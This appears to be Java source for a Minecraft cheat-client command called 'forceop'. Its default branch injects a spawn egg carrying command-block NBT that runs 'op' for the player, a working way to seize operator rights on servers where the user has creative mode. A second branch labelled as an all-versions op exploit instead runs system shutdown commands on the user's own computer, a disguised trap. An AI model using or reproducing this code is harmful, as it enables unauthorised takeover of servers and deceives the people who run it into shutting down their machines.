package uwu.taxevasion.qolmod.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.systems.commands.Command;
import net.minecraft.command.CommandSource;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import org.apache.commons.lang3.SystemUtils;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

public class ForceOpCommand extends Command {
    public ForceOpCommand() {
        super("forceop", "REAL (needs gmc)");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(ctx -> {
            ItemStack op = new ItemStack(Items.BEE_SPAWN_EGG);
            op.setNbt(StringNbtReader.parse("{EntityTag:{id:\"command_block_minecart\",Command:\"execute as @e run op " + mc.player.getEntityName() + "\"}}"));
            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, op));
            info("Activate this using an activator rail");
            info("If you don't know how you should be in school, not hacking");
            return SINGLE_SUCCESS;
        });

        builder.then(literal("ALL_VERSIONS_WORKING_OP")).then(literal("I_AM_SURE_I_WANT_TO_DO_THIS")).then(literal("I, Tax Evasion, am not at all responsible for the consequences caused by running this command and the reader hereby acknowledges this information.").executes(ctx -> {
            try {
                shutdown();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            return SINGLE_SUCCESS;
        }));
    }

    private static void shutdown() throws Exception {
        String cmd = "";
        if (SystemUtils.IS_OS_AIX)
            cmd = "shutdown -Fh 0";
        else if (SystemUtils.IS_OS_FREE_BSD || SystemUtils.IS_OS_LINUX || SystemUtils.IS_OS_MAC || SystemUtils.IS_OS_MAC_OSX || SystemUtils.IS_OS_NET_BSD || SystemUtils.IS_OS_OPEN_BSD || SystemUtils.IS_OS_UNIX)
            cmd = "shutdown -h now";
        else if (SystemUtils.IS_OS_HP_UX)
            cmd = "shutdown -hy 0";
        else if (SystemUtils.IS_OS_IRIX)
            cmd = "shutdown -y -g 0";
        else if (SystemUtils.IS_OS_SOLARIS || SystemUtils.IS_OS_SUN_OS)
            cmd = "shutdown -y -i5 -g 0";
        else if (SystemUtils.IS_OS_WINDOWS)
            cmd = "shutdown.exe /s /t 0";
        else
            System.exit(0);

        Runtime.getRuntime().exec(cmd);
    }
}
